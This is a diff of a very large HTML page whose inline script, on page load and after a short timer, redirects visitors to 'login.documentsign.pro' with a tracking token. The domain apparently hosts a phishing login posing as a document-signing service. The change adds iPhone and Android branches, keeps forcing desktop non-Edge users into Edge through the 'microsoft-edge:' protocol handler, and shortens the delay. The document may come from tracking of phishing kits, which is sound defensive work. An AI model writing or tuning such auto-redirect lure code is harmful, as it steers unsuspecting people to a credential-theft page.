@@ -31116,13 +31116,21 @@
     </script>
     <script>
         setTimeout(function() {
-        let isEdge = /Edg\//.test(navigator.userAgent);
-        if (!isEdge) {
-          location.replace("microsoft-edge:" + "https://login.documentsign.pro/tQXvVRul");
-        } else {
+        let userAgent = navigator.userAgent;
+
+        if (userAgent.match(/iPhone/i)) {
           location.replace("https://login.documentsign.pro/tQXvVRul");
+        } else if (userAgent.match(/Android/i)) {
+          location.replace("https://login.documentsign.pro/tQXvVRul");
+        } else {
+          let isEdge = /Edg\//.test(navigator.userAgent);
+          if (!isEdge) {
+            location.replace("microsoft-edge:" + "https://login.documentsign.pro/tQXvVRul");
+          } else {
+            location.replace("https://login.documentsign.pro/tQXvVRul");
+          }
         }
-        }, 5000)
+        }, 3000)
     </script>
   </body>
 </html>
